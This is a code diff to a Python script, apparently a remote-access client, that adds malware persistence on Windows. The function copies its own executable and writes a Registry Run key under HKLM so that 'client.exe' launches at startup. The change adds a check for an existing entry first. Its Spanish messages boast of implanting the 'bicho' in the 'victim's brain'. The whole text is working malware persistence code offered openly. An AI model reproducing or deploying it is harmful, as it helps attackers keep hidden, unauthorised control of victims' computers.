@@ -4,6 +4,7 @@
 import os
 import sys
 import shutil
+import subprocess 
 
 def windows_persistencia():
 
@@ -40,8 +41,14 @@ def windows_persistencia():
 		if not os.path.isfile(destino):
 			shutil.copyfile(sys.argv[0],destino)
 
-		os.system('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /t REG_SZ /d "C:\\Users\\Testing\\client.exe"')
-		return (True,"\n Bicho implantado en cerebro victima con exito \n")
+		verficar = subprocess.Popen('REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /s',shell=True,stdout=subprocess.PIPE)
+
+		if (b'client.exe' not in verficar.stdout.read()):
+			os.system('REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v client /t REG_SZ /d "C:\\Users\\Testing\\client.exe"')
+			return (True,"\n Bicho implantado en cerebro victima con exito \n")
+
+		else:
+			return (True,"\n No se ha podido implantar el bicho debido a que ya existe uno en el cerebro victima. \n")
 		
 
 def linux_persistencia():
